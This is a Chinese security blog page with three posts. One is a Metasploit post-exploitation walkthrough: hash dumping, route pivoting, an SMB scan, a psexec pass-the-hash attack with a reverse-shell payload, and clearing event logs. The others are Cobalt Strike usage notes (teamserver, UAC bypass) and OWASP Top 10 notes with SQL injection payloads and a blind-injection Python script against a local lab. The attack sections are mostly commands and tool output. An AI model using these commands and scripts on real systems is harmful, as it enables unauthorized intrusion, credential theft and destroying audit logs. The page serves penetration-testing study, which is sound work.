fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[*]     No users with password hints on this system</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     liukaifeng01:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>



<h3 id="2-6-内网拓展"><a href="#2-6-内网拓展" class="headerlink" title="2.6 内网拓展"></a><strong>2.6 内网拓展</strong></h3><p><strong>内网拓展功能，添加路由，将目标机器作为跳板机进入内网其它主机，有以下两种方式：</strong>                                                                                                                                                                                                                                                                                                                                                                                                                                   </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">126.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; route add <span class="number">192.168</span>.<span class="number">52.0</span> <span class="number">255.255</span>.<span class="number">255.0</span> <span class="number">3</span></span><br><span class="line">[*] Route added</span><br><span class="line">msf5 exploit(multi/handler) &gt; route print </span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">192.168</span>.<span class="number">52.0</span>       <span class="number">255.255</span>.<span class="number">255.0</span>      Session <span class="number">3</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp </span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">24</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span></span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set ports <span class="number">445</span></span><br><span class="line">ports =&gt; <span class="number">445</span></span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span>:      - Scanned  <span class="number">13</span> of <span class="number">128</span> hosts (<span class="number">10</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span>:      - Scanned <span class="number">128</span> of <span class="number">128</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line"></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">126.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">meterpreter &gt; run autoroute <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[*] Adding a route to <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span>...</span><br></pre></td></tr></table></figure>



<p><strong>利用获取的口令进行传递攻击，如果密码一致，就可成功返回meterpreter会话：</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set lhost <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set lport <span class="number">443</span></span><br><span class="line">lport =&gt; <span class="number">443</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.138</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.138</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.141</span></span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBPass b4df3d6cb6929cc09cb07285b13aca78:<span class="number">9</span>c8be841d72dbd132d22477ff8b7e9d3</span><br><span class="line">SMBPass =&gt; b4df3d6cb6929cc09cb07285b13aca78:<span class="number">9</span>c8be841d72dbd132d22477ff8b7e9d3</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">443</span> </span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> - Connecting to the server...</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> - Authenticating to <span class="number">192.168</span>.<span class="number">52.141</span>:<span class="number">445</span> as user <span class="string">''</span>...</span><br></pre></td></tr></table></figure>



<h3 id="2-7-掩踪灭迹"><a href="#2-7-掩踪灭迹" class="headerlink" title="2.7 掩踪灭迹"></a><strong>2.7 掩踪灭迹</strong></h3><p><strong>清除日志痕迹</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line">[*] Wiping <span class="number">1509</span> records from Application...</span><br><span class="line">[*] Wiping <span class="number">4759</span> records from System...</span><br><span class="line">[*] Wiping <span class="number">1453</span> records from Security...</span><br></pre></td></tr></table></figure>






      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="cobalt-strike" class="article article-type-cobalt" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/08/25/strike/"
    >cobalt strike</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/08/25/strike/" class="article-date">
  <time datetime="2020-08-25T13:03:33.000Z" itemprop="datePublished">2020-08-25</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>Cobalt Strike 是一款非常成熟的渗透框架，这里主要记录下它常用的用法。</p>
<p>使用方法：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#部署团队服务器,可支持多人使用</span></span><br><span class="line">root@kali:~/tools/cobaltstrike4.<span class="number">0</span><span class="comment"># ./teamserver 192.168.126.33 ccc123123</span></span><br><span class="line">[*] Will use existing X509 certificate and keystore (<span class="keyword">for</span> SSL)</span><br><span class="line">Picked up _JAVA_OPTIONS: <span class="literal">-Dawt</span>.useSystemAAFontSettings=on <span class="literal">-Dswing</span>.aatext=true</span><br><span class="line">[+] Team server is up on <span class="number">50050</span></span><br><span class="line">[*] SHA256 hash of SSL cert is: e22556354f8564451d11ff1bba9a2d1b47ba889b5ec147267597dcd8b7a858ad</span><br><span class="line">[+] Listener: win7 started!</span><br><span class="line">[+] Listener: hongri5 started!</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行，密码即之前设置的团队服务器密码</span></span><br><span class="line">root@kali:~/tools/cobaltstrike4.<span class="number">0</span><span class="comment"># ./start.sh </span></span><br><span class="line">Picked up _JAVA_OPTIONS: <span class="literal">-Dawt</span>.useSystemAAFontSettings=on <span class="literal">-Dswing</span>.aatext=true</span><br></pre></td></tr></table></figure>







<h2 id="后渗透模块介绍："><a href="#后渗透模块介绍：" class="headerlink" title="后渗透模块介绍："></a><strong>后渗透模块介绍：</strong></h2><p>Cobalt Strike 的后渗透模块，可用于<strong>信息收集、权限提升、端口扫描、端口转发、横向移动、持久化</strong>等</p>
<h3 id="1-使用Elevate模块提升权限"><a href="#1-使用Elevate模块提升权限" class="headerlink" title="1.使用Elevate模块提升权限"></a>1.使用Elevate模块提升权限</h3><p>elevate [exploit] [listener]</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此模块目前内置了uac-token-duplication和svc-exe模块，可以自行添加其它模块</span></span><br><span class="line">elevate uac<span class="literal">-token</span><span class="literal">-duplication</span> hongri5 <span class="comment">#用于bypassUAC</span></span><br></pre></td></tr></table></figure>





<p><img src="/2020/08/25/strike/1.png" alt></p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-OWASP-Top10" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/08/21/OWASP-Top10/"
    >OWASP-Top10</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/08/21/OWASP-Top10/" class="article-date">
  <time datetime="2020-08-21T07:08:52.000Z" itemprop="datePublished">2020-08-21</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="1-注入（Injection）"><a href="#1-注入（Injection）" class="headerlink" title="1.注入（Injection）"></a><strong>1.注入（Injection）</strong></h2><p>将不安全的命令作为命令发送给解析器，会产生类似于SQL注入、NoSQL注入、OS注入的缺陷，攻击者可以构造恶意数据通过注入缺陷的解析器执行没有权限非预期命令或访问数据。最常见的就是SQL注入，这里主要介绍SQL注入的原理和防御手段。</p>
<h3 id="什么是SQL注入（SQLi）？"><a href="#什么是SQL注入（SQLi）？" class="headerlink" title="什么是SQL注入（SQLi）？"></a><strong>什么是SQL注入（SQLi）？</strong></h3><p>SQL注入是一个网络安全漏洞，攻击者可以利用该漏洞来干扰应用程序对其数据库的查询。通常，它使<strong>攻击者可以查看他们通常无法检索的数据</strong>。这可能包括属于<strong>其他用户的数据</strong>，<strong>或者应用程序本身能够访问的任何其他数据</strong>。在许多情况下，攻击者可以<strong>修改或删除此数据</strong>，从而导致应用程序内容或行为的永久更改。</p>
<p>在某些情况下，攻击者可以升级SQL注入攻击以<strong>破坏基础服务器或其他后端基础结构</strong>，或者执行拒绝服务攻击。</p>
<p>数据库种类较多，最常用的三种就是Oracle、MySQL、MS-SQL，下面主要讲解MySQL平台的漏洞。</p>
<h4 id="注入语句构造基础—union攻击"><a href="#注入语句构造基础—union攻击" class="headerlink" title="注入语句构造基础—union攻击"></a><strong>注入语句构造基础—union攻击</strong></h4><p><code>UNION</code>可以执行一个或多个额外的<code>SELECT</code>查询和结果对原始查询追加。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT a, b FROM table1 UNION SELECT c, d FROM table2</span><br></pre></td></tr></table></figure>

<p>为了使<code>UNION</code>查询正常工作，必须满足两个关键要求：</p>
<ul>
<li><strong>各个查询必须返回相同数量的列。</strong></li>
<li><strong>每列中的数据类型在各个查询之间必须兼容。</strong></li>
</ul>
<p>要执行SQL注入UNION攻击，需要确保您的攻击满足这两个要求。这通常涉及找出：</p>
<ul>
<li><strong>原始查询返回了多少列？</strong></li>
<li><strong>从原始查询返回的哪些列具有适合的数据类型，以保存来自注入查询的结果？</strong></li>
</ul>
<p><strong>执行SQL注入UNION攻击时，有两种有效的方法来确定从原始查询返回多少列：</strong></p>
<p>第一种方法涉及注入一系列<code>ORDER BY</code>子句并递增指定的列索引，<strong>直到发生错误为止</strong>。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' ORDER BY 1--</span></span><br><span class="line"><span class="string">'</span> ORDER BY <span class="number">2</span>--</span><br><span class="line"><span class="string">' ORDER BY 3--</span></span><br></pre></td></tr></table></figure>

<p>第二种方法涉及提交一系列<code>UNION SELECT</code>指定不同数量的空值的有效载荷：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' UNION SELECT NULL--</span></span><br><span class="line"><span class="string">'</span> UNION SELECT NULL,NULL--</span><br><span class="line"><span class="string">' UNION SELECT NULL,NULL,NULL--</span></span><br></pre></td></tr></table></figure>

<p><strong>在SQL注入UNION攻击中查找具有有用数据类型的列</strong></p>
<p>已经确定了所需的列数之后，您可以通过提交一系列<code>UNION SELECT</code>将字符串值依次放入各列的有效负载，来探查各列以测试其是否可以容纳字符串数据。例如，<strong>如果查询返回四列</strong>，则您将提交：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39; UNION SELECT &#39;a&#39;,NULL,NULL,NULL--</span><br><span class="line">&#39; UNION SELECT NULL,&#39;a&#39;,NULL,NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL,&#39;a&#39;,NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL,NULL,&#39;a&#39;--</span><br></pre></td></tr></table></figure>

<p>如果列的数据类型与字符串数据不兼容，则注入的查询将导致数据库错误，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Conversion failed when converting the varchar value &#39;a&#39; to data type int.</span><br></pre></td></tr></table></figure>

<p>如果没有发生错误，并且应用程序的响应包含一些其他内容，包括注入的字符串值，则相关列适合于检索字符串数据。</p>
<p><strong>注意：</strong></p>
<ul>
<li>之所以将其<code>NULL</code>用作插入<code>SELECT</code>查询的返回值，是因<strong>为原始查询和插入查询之间的每一列中的数据类型必须兼容</strong>。由于<code>NULL</code><strong>可以转换为每种常用的数据类型</strong>，因此使用可以<code>NULL</code>最大程度地提高当列数正确时有效负载成功的机会。</li>
<li>在Oracle上，每个<code>SELECT</code>查询都必须使用<code>FROM</code>关键字并指定一个有效表。Oracle上有一个内置表<code>DUAL</code>，可用于此目的。因此，在Oracle上注入的查询将需要如下所示：<code>&#39; UNION SELECT NULL FROM DUAL--</code></li>
<li>当空数与列数匹配时，数据库将在结果集中返回另一行，其中每一列均包含空值。对产生的HTTP响应的影响取决于应用程序的代码。如果幸运的话，<strong>您将在响应中看到一些其他内容，例如HTML表格上的额外行</strong>。否则，空值可能会触发其他错误，例如<code>NullPointerException</code>。<strong>最坏的情况是响应可能与由不正确的null数引起的响应没有区别，这使确定列数的此方法无效</strong></li>
</ul>
<p>Blind SQL injection</p>
<p>定义：当应用程序容易受到SQL注入攻击但其HTTP响应不包含相关SQL查询的结果或任何数据库错误的详细信息时，就会出现盲SQL注入。</p>
<p>由于存在盲目的SQL注入漏洞，许多技术（例如[<code>UNION</code>攻击）均无效，因为它们依赖于能够在应用程序的响应中查看注入查询的结果。仍然可以利用盲SQL注入来访问未经授权的数据，但是必须使用不同的技术</p>
<h3 id="SQL注入测试步骤"><a href="#SQL注入测试步骤" class="headerlink" title="SQL注入测试步骤"></a><strong>SQL注入测试步骤</strong></h3><p>为了方便理解，通过sqli-labs靶场，sqlmap工具，进行测试说明</p>
<p>sqlmap支持以下5种注入模式，所以后面也将详细介绍这5种模式的代码和原理</p>
<ul>
<li>1 <strong>基于布尔的盲注</strong>，即可以根据返回页面判断条件真假的注入；</li>
<li>2 <strong>基于时间的盲注</strong>，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li>
<li>3 <strong>基于报错注入</strong>，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li>
<li>4 <strong>联合查询注入</strong>，可以使用union的情况下的注入；</li>
<li>5 <strong>堆查询注入</strong>，可以同时执行多条语句的执行时的注入。</li>
</ul>
<h4 id="（1）基于时间的盲注"><a href="#（1）基于时间的盲注" class="headerlink" title="（1）基于时间的盲注"></a><strong>（1）基于时间的盲注</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url_template = <span class="string">"http://127.0.0.1:8080/Less-8/?id=1' and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23"</span></span><br><span class="line">    chars = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url = url_template.format(i,char_ascii) <span class="comment">#分别对应url的&#123;0&#125;、&#123;1&#125;</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            length = len(response.text) </span><br><span class="line">            <span class="comment">#返回的长度只有706和722</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">706</span>:</span><br><span class="line">                result += char</span><br><span class="line">                print(length,char,char_ascii)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br><span class="line">get_db_name()</span><br></pre></td></tr></table></figure>





<h2 id="2-失效的身份认证（Broken-Authentication）"><a href="#2-失效的身份认证（Broken-Authentication）" class="headerlink" title="2.失效的身份认证（Broken Authentication）"></a><strong>2.失效的身份认证（Broken Authentication）</strong></h2><p>通过错误使用应用程序的身份认证和会话管理功能攻击者能够破译密码、密钥或会话令牌，或者暂时或永久的冒充其他用户的身份</p>
<p><strong>身份验证漏洞如何产生？</strong></p>
<p>广义上讲，身份验证机制中的大多数漏洞是通过以下两种方式之一产生的：</p>
<ul>
<li>认证机制之所以薄弱，是因为它们无法充分防御<a href="https://portswigger.net/web-security/authentication/password-based" target="_blank" rel="noopener">暴力</a>攻击。</li>
<li>实施中的逻辑缺陷或较差的编码允许攻击者完全绕过身份验证机制。有时将其称为“中断身份验证”。</li>
</ul>
<p>在Web开发的许多领域，<a href="https://portswigger.net/web-security/logic-flaws" target="_blank" rel="noopener">逻辑缺陷</a>只会导致网站异常运行，这可能是安全问题，也可能不是安全问题。但是，由于身份验证对于安全性至关重要，因此，有缺陷的身份验证逻辑使网站暴露于安全问题的可能性明显增加。</p>
<p>主要在以下三个方面研究此漏洞：</p>
<h3 id="（1）基于暴力破解密码"><a href="#（1）基于暴力破解密码" class="headerlink" title="（1）基于暴力破解密码"></a><strong>（1）基于暴力破解密码</strong></h3><p>暴力破解并不总是仅是对用户名和密码进行完全随机猜测的情况。通过使用基本逻辑或公开可用的知识，攻击者可以微调蛮力攻击，以做出更有根据的猜测。这大大提高了这种攻击的效率。如果网站未实施足够的暴力保护，则将基于密码的登录作为唯一的用户身份验证方法的网站可能会非常脆弱</p>
<h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><p>用户名枚举是指攻击者能够观察网站行为的变化以识别给定的用户名是否有效。</p>
<p>用户名枚举通常发生在登录页面上，例如，当您输入有效的用户名但密码不正确时，或者在注册表格中输入已使用的用户名。因为攻击者能够快速生成有效用户名的候选列表，所以这大大减少了暴力登录所需的时间和精力。</p>
<p>在尝试强行登录页面时，应特别注意以下方面的任何差异：</p>
<ul>
<li><strong>状态码</strong>：在蛮力攻击中，对于大多数猜测来说，返回的HTTP状态码可能是相同的，因为大多数猜测都是错误的。如果猜测返回不同的状态码，则表明用户名正确。最好的做法是，无论结果如何，网站始终返回相同的状态码，但是并不总是遵循这种做法。</li>
<li><strong>错误消息</strong>：有时，返回的错误消息会有所不同，具体取决于用户名和密码不正确还是仅密码不正确。最好的做法是，在两种情况下网站都使用相同的通用消息，但是有时会出现小的键入错误。即使在呈现的页面上看不到该字符的情况下，只有一个字符的位置不正确也会使这两个消息有所区别。</li>
<li><strong>响应时间</strong>：如果大多数请求都以相似的响应时间处理，则任何偏离此时间的行为都表明幕后发生了一些不同的事情。这是猜测用户名可能正确的另一种指示。例如，网站可能仅在用户名有效时检查密码是否正确。此额外步骤可能会导致响应时间略有增加。这可能是微妙的，但是攻击者可以通过输入一个过长的密码来使此延迟更加明显，而该密码需要花费更长的时间才能处理。</li>
</ul>
<p><strong>防止暴力攻击的两种最常见方法是：</strong></p>
<ul>
<li><strong>如果远程用户多次尝试登录失败，则锁定远程用户尝试访问的帐户</strong></li>
<li><strong>如果远程用户连续多次尝试登录，则阻止远程用户的IP地址</strong></li>
</ul>
<p>两种方法都提供了不同程度的保护，但都不是无懈可击的，特别是如果使用有缺陷的逻辑实现的话。</p>
<p>例如，如果您多次登录失败，您有时可能会发现IP被阻止。在某些实现中，如果IP所有者成功登录，则失败尝试次数的计数器将重置。这意味着攻击者只需<strong>每尝试几次就可以登录自己的帐户</strong>，以<strong>防止达到此限制</strong>。</p>
<p>在这种情况下，仅在整个单词列表中定期包含自己的登录凭据就足以使这种防御几乎毫无用处。</p>
<h3 id="（2）多重身份验证中的漏洞"><a href="#（2）多重身份验证中的漏洞" class="headerlink" title="（2）多重身份验证中的漏洞"></a><strong>（2）多重身份验证中的漏洞</strong></h3><p>可能存在通过抓包，获得登陆认证cookie，再修改用户名等，从而绕过限制</p>
<h2 id="3-敏感数据暴露（Sensitive-Data-Exposure）"><a href="#3-敏感数据暴露（Sensitive-Data-Exposure）" class="headerlink" title="3.敏感数据暴露（Sensitive Data Exposure）"></a><strong>3.敏感数据暴露（Sensitive Data Exposure）</strong></h2><p>如果未正确实施安全控制（例如HTTPS），则可能会发生敏感数据泄露，从而使攻击者可以窃取敏感信息，例如密码，付款信息，ID，地址以及您可能存储的任何其他内容。可能很有价值。应用程序应确保对访问进行身份验证并加密数据。失败可能会导致严重的隐私侵害。</p>
<p>原理：</p>
<p><strong>攻击者不是直接攻击密码，而是在传输过程中或从客户端窃取密钥、发起中间人攻击，或从服务器端窃取明文数据，还有可能由于管理员的安全性不高，使用弱密码，被攻击者暴力破解，进入到数据库拿到敏感信息</strong></p>
<p>防御敏感信息泄露的方法：<br>(<strong>1):对系统处理、存储或传输的数据分类，并根据分类进行访问控制</strong><br><strong>(2):对重要数据进行加密存放，数据在传输过程中使用密文进行传输</strong><br><strong>(3):及时清理没有用的敏感数据，只能使用指定用户访问敏感数据</strong></p>
<h2 id="4-XML外部实体（XXE）"><a href="#4-XML外部实体（XXE）" class="headerlink" title="4.XML外部实体（XXE）"></a><strong>4.XML外部实体（XXE）</strong></h2><p>XML外部实体攻击是针对解析XML输入的应用程序的一种攻击。<strong>当弱配置的XML解析器处理包含对外部实体的引用的XML</strong>输入时，就会发生此攻击。这种攻击可能导致泄露机密数据，拒绝服务，伪造服务器端请求，从解析器所在的计算机角度进行端口扫描以及其他系统影响。</p>
<h3 id="（1）XML基础介绍"><a href="#（1）XML基础介绍" class="headerlink" title="（1）XML基础介绍"></a><strong>（1）XML基础介绍</strong></h3><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
<p><img src="/2020/08/21/OWASP-Top10/1.png" alt></p>
<p><strong>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用</strong></p>
<p><strong>内部声明DTD</strong></p>
<p>根元素 [元素声明]&gt;</p>
<p><strong>引用外部DTD</strong><br>根元素 SYSTEM “文件名”&gt;<br>或者<br>根元素 PUBLIC “public_ID” “文件名”&gt;</p>
<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p><strong>内部声明实体</strong><br>实体名称 “实体的值”&gt;</p>
<p><strong>引用外部实体</strong><br>实体名称 SYSTEM “URI”&gt;<br>或者实体名称 PUBLIC “public_ID” “URI”&gt;</p>
<p><strong>XML外部实体注入(XML External Entity)</strong></p>
<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<p>引入外部实体方式有多种，比如：</p>
<p><img src="/2020/08/21/OWASP-Top10/2.png" alt></p>
<p>说到底本质就是，插入可执行xml语句，实现获取信息功能</p>
<p><strong>四、防御XXE攻击</strong></p>
<p><strong>方案一、使用开发语言提供的禁用外部实体的方法</strong></p>
<p>PHP：</p>
<p>libxml_disable_entity_loader(true);</p>
<p>其他语言:<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></p>
<p><strong>方案二、过滤用户提交的XML数据</strong><br>关键词：SYSTEM和PUBLIC。</p>
<p>参考：<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p>
<p>无论是WEB程序，还是PC程序，只要处理用户可控的XML都可能存在危害极大的XXE漏洞，开发人员在处理XML时需谨慎，在用户可控的XML数据里禁止引用外部实体。</p>
<h2 id="5-失效访问控制（Broken-Access-Control）"><a href="#5-失效访问控制（Broken-Access-Control）" class="headerlink" title="5.失效访问控制（Broken Access Control）"></a><strong>5.失效访问控制（Broken Access Control）</strong></h2><p>错误的访问控制可能是由于用户强制实施的限制而导致的访问控制存在缺陷，这使攻击者能够利用和访问未经授权的功能或数据。访问控制旨在控制应用程序中允许和禁止执行哪些“授权”用户，并建立适当的访问控制，该应用程序必须确保其执行可靠的授权检查，并且适当的身份验证可以告知哪些用户用户是特权用户，实际上是随机的Internet用户。</p>
<p> <strong>失效的访问控制攻击原理</strong><br>(1):攻击者通过修改 URL、内部应用程序状态或 HTML 页面绕过访问控制检查，或简单地使用自定义的 API 攻击工具<br>(2):特权提升:在不登录的情况下假扮用户，或以用户身份登录时充当管理员<br>(3):元数据操作:如重放或篡改 JWT 访问控制令牌，以此来修改cookie提升权限</p>
<p><strong>防御失效的访问控制的方法</strong><br>(1):除公有资源外，其他资源默认情况下拒绝访问<br>(2):使用一次性的访问控制机制，并在整个应用程序中不断重用它们<br>(3):建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录<br>(4):当用户注销后，服务器上的JWT令牌应失效</p>
